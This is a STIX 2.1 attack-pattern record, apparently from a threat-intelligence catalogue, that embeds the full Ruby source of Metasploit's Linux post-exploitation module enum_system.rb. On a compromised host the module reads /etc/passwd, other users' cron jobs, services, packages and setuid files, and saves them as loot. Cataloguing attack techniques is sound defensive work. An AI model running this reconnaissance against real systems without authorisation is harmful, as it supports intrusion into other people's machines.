{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2554a495-5d94-4a26-9267-238f3e3ea7a8",
    "created": "2024-08-14T16:33:17.30094Z",
    "modified": "2024-08-14T16:33:17.300943Z",
    "name": "Linux Gather System and User Information",
    "description": " This module gathers system information. We collect installed packages, installed services, mount information user list, user bash history and cron jobs  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/enum_system.rb",
            "external_id": "enum_system.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Gather System and User Information',\n        'Description' => %q{\n          This module gathers system information. We collect\n          installed packages, installed services, mount information,\n          user list, user bash history and cron jobs\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Carlos Perez <carlos_perez[at]darkoperator.com>', # get_packages and get_services\n          'Stephen Haywood <averagesecurityguy[at]gmail.com>', # get_cron and original enum_linux\n          'sinn3r', # Testing and modification of original enum_linux\n          'ohdae <bindshell[at]live.com>', # Combined separate mods, modifications and testing\n          'Roberto Espreto <robertoespreto[at]gmail.com>', # log files and setuid/setgid\n        ],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell', 'meterpreter']\n      )\n    )\n  end\n\n  def run\n    distro = get_sysinfo\n    store_loot(\n      'linux.version',\n      'text/plain',\n      session,\n      \"Distro: #{distro[:distro]},Version: #{distro[:version]}, Kernel: #{distro[:kernel]}\",\n      'linux_info.txt',\n      'Linux Version'\n    )\n\n    # Print the info\n    print_good('Info:')\n    print_good(\"\\t#{distro[:version]}\")\n    print_good(\"\\t#{distro[:kernel]}\")\n\n    users = execute('/bin/cat /etc/passwd | cut -d : -f 1')\n    user = execute('/usr/bin/whoami')\n\n    print_good(\"\\tModule running as \\\"#{user}\\\" user\")\n\n    installed_pkg = get_packages(distro[:distro])\n    installed_svc = get_services(distro[:distro])\n\n    mount = execute('/bin/mount -l')\n    crons = get_crons(users, user)\n    diskspace = execute('/bin/df -ahT')\n    disks = (mount + \"\\n\\n\" + diskspace)\n    logfiles = execute('find /var/log -type f -perm -4 2> /dev/null')\n    uidgid = execute('find / -xdev -type f -perm +6000 -perm -1 2> /dev/null || find / -xdev -type f -perm /6000 -perm -1 2> /dev/null')\n\n    save('Linux version', distro)\n    save('User accounts', users)\n    save('Installed Packages', installed_pkg)\n    save('Running Services', installed_svc)\n    save('Cron jobs', crons)\n    save('Disk info', disks)\n    save('Logfiles', logfiles)\n    save('Setuid/setgid files', uidgid)\n    save('CPU Vulnerabilities', get_cpu_vulnerabilities)\n  end\n\n  def save(msg, data, ctype = 'text/plain')\n    ltype = 'linux.enum.system'\n    loot = store_loot(ltype, ctype, session, data, nil, msg)\n    print_status(\"#{msg} stored in #{loot}\")\n  end\n\n  def execute(cmd)\n    vprint_status(\"Execute: #{cmd}\")\n    output = cmd_exec(cmd)\n    output\n  end\n\n  def get_packages(distro)\n    packages_installed = ''\n    case distro\n    when /fedora|redhat|suse|mandrake|oracle|amazon/\n      packages_installed = execute('rpm -qa')\n    when /slackware/\n      packages_installed = execute('/bin/ls /var/log/packages')\n    when /ubuntu|debian/\n      packages_installed = execute('/usr/bin/dpkg -l')\n    when /gentoo/\n      packages_installed = execute('equery list')\n    when /arch/\n      packages_installed = execute('/usr/bin/pacman -Q')\n    else\n      print_error('Could not determine package manager to get list of installed packages')\n    end\n    packages_installed\n  end\n\n  def get_services(distro)\n    services_installed = ''\n    case distro\n    when /fedora|redhat|suse|mandrake|oracle|amazon/\n      services_installed = execute('/sbin/chkconfig --list')\n    when /slackware/\n      services_installed << \"\\nEnabled:\\n*************************\\n\"\n      services_installed << execute(\"ls -F /etc/rc.d | /bin/grep \\'*$\\'\")\n      services_installed << \"\\n\\nDisabled:\\n*************************\\n\"\n      services_installed << execute(\"ls -F /etc/rc.d | /bin/grep \\'[a-z0-9A-z]$\\'\")\n    when /ubuntu|debian/\n      services_installed = execute('/usr/sbin/service --status-all')\n    when /gentoo/\n      services_installed = execute('/bin/rc-status --all')\n    when /arch/\n      services_installed = execute(\"/bin/egrep '^DAEMONS' /etc/rc.conf\")\n    else\n      print_error('Could not determine the Linux Distribution to get list of configured services')\n    end\n    services_installed\n  end\n\n  def get_cpu_vulnerabilities\n    execute('grep -r . /sys/devices/system/cpu/vulnerabilities').to_s\n  end\n\n  def get_crons(users, user)\n    if user == 'root' && users\n      users = users.chomp.split\n      users.each do |u|\n        next unless u == 'root'\n\n        vprint_status('Enumerating as root')\n        cron_data = ''\n        users.each do |usr|\n          cron_data << \"*****Listing cron jobs for #{usr}*****\\n\"\n          cron_data << execute(\"crontab -u #{usr} -l\") + \"\\n\\n\"\n        end\n      end\n    else\n      vprint_status(\"Enumerating as #{user}\")\n      cron_data = \"***** Listing cron jobs for #{user} *****\\n\\n\"\n      cron_data << execute('crontab -l')\n\n      # Save cron data to loot\n      cron_data\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}